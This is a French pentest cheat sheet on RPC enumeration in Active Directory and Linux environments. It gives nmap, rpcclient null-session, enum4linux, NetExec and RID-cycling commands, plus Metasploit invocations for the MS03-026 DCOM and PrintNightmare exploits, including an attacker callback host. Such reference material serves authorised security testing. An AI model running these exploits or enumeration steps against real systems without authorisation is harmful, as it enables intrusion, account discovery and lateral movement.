#  RPC Enumeration

RPC (Remote Procedure Call) est un protocole permettant à un programme d'exécuter des procédures sur un système distant. Dans les environnements Windows et Active Directory, il est massivement utilisé pour l'administration distante, l'énumération d'utilisateurs, de groupes et de partages. C'est une cible de choix en pentest pour l'énumération AD et le mouvement latéral.



##  Objectifs

- Identifier les services RPC exposés
- Enumérer les utilisateurs et groupes du domaine
- Extraire des informations sur le système
- Tester l'accès anonyme (null session)
- Identifier des vecteurs d'exploitation



##  Ports

| Port      | Service              |
|-----------|----------------------|
| 111       | RPCBind (Linux)      |
| 135       | MSRPC (Windows)      |
| 137-139   | NetBIOS              |
| 445       | SMB (transport RPC)  |
| 49152+    | RPC Dynamic Ports    |



##  Quick Enumeration

::: code-group
```bash [nmap]
# Scan rapide
nmap -p111,135 <target>
```
```bash [rpcclient]
# Null session
rpcclient -U "" -N <target>
```
```bash [enum4linux]
# Enum avec enum4linux
enum4linux -a <target>
```
```bash [smb]
# Enum avec NetExec
nxc smb <target> -u '' -p ''
```
:::


##  Workflow 
```
1. Scan des ports RPC (111, 135)
2. Identification des services enregistrés
3. Test null session (accès anonyme)
4. Enumération users / groupes / domaine
5. Bruteforce / password spraying
6. Exploitation des interfaces RPC exposées
7. Mouvement latéral
```



##  Nmap

### Scan basique
```bash
nmap -p111,135 <target>
```

### Détection version
```bash
nmap -p111,135 -sV <target>
```

### Scripts NSE
```bash
# Enum services RPC
nmap -p111 --script rpcinfo <target>

# MSRPC info
nmap -p135 --script msrpc-enum <target>

# Full enum
nmap -p111,135 --script rpc-* <target>
```



##  Enumeration

### Connexion null session
```bash
rpcclient -U "" -N <target>
```

### Connexion avec credentials
```bash
rpcclient -U "user%password" <target>
```

### Commandes rpcclient utiles
```bash
# Info serveur
srvinfo

# Enum utilisateurs
enumdomusers

# Enum groupes
enumdomgroups

# Info utilisateur spécifique
queryuser <RID>

# Enum membres d'un groupe
querygroupmem <RID>

# Enum shares
netshareenum

# Info domaine
querydominfo

# Enum politiques de mots de passe
getdompwinfo

# Enum privilèges
enumprivs

# Lookup SID
lookupsids <SID>

# Lookup username
lookupnames <username>
```

### RPCBind (Linux)
```bash
# Lister les services RPC enregistrés
rpcinfo -p <target>

# Via nmap
nmap -p111 --script rpcinfo <target>
```

### Enum avancée avec enum4linux
```bash
enum4linux -a <target>
enum4linux -U <target>
enum4linux -G <target>
```


##  Exploitation

### Recherche d'exploits
```bash
searchsploit msrpc
searchsploit rpc
```

### MS03-026 / MS03-039 (RPC DCOM)
```bash
use exploit/windows/dcerpc/ms03_026_dcom
set RHOSTS <target>
run
```

### PrintNightmare (CVE-2021-1675)
```bash
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS <target>
set LHOST <attacker>
run
```

### Enum SIDs par brute force RID
```bash
# Via rpcclient
for i in $(seq 500 1100); do
  rpcclient -N -U "" <target> -c "queryuser $i" 2>/dev/null | grep "User Name"
done

```


##  Post-Exploitation

- Extraire la liste complète des utilisateurs et groupes
- Identifier les comptes admin et de service
- Dumper les politiques de mots de passe
- Utiliser les infos pour pivot ou escalade

```bash
# Dump complet via rpcclient
rpcclient -U "user%password" <target> -c "enumdomusers"
rpcclient -U "user%password" <target> -c "enumdomgroups"

```



##  Anonymous Access

### Test null session rpcclient
```bash
rpcclient -U "" -N <target>
```

### Test via NetExec
```bash
nxc smb <target> -u '' -p ''
nxc smb <target> -u 'guest' -p ''
```

### Test via enum4linux
```bash
enum4linux -a <target>
```



##  Points d'attaque

- Null session activée (accès anonyme)
- RID cycling pour énumérer les utilisateurs
- Interfaces DCOM / RPC mal sécurisées
- PrintSpooler exposé (PrintNightmare)
- Politiques de mots de passe faibles récupérables
- Services RPC non patchés (MS03-026, etc.)
- Dynamic ports ouverts sans filtrage



::: info Tips

- Toujours tester la null session en premier avec `rpcclient -U "" -N`
- Utiliser `enumdomusers` puis brute-forcer les RID avec `queryuser`
- `impacket-lookupsid` est plus rapide pour le RID cycling
- Croiser rpcclient + enum4linux + NetExec pour une couverture complète
- Vérifier si PrintSpooler est actif (vecteur PrintNightmare)
- Les dynamic ports (49152+) peuvent exposer des interfaces critiques

:::

::: details Checklist

- Port 111 / 135 ouvert
- Services RPC enregistrés identifiés
- Null session testée
- Utilisateurs énumérés (enumdomusers)
- Groupes énumérés (enumdomgroups)
- RID cycling effectué
- Politiques de mots de passe récupérées
- PrintSpooler vérifié
- Exploit version testé

:::


## 🧾 Notes
```
 # Notes terrain
```


##  Tools

- [Nmap](https://nmap.org/)
- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Metasploit](https://www.metasploit.com/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)



## 📚 Ressources

- [HackTricks RPC Pentesting](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
- [HackTricks RPCBind](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind)
- [PayloadsAllTheThings AD Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Impacket lookupsid](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)
- [PrintNightmare CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)





<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/rpc.md)</span>

</div>
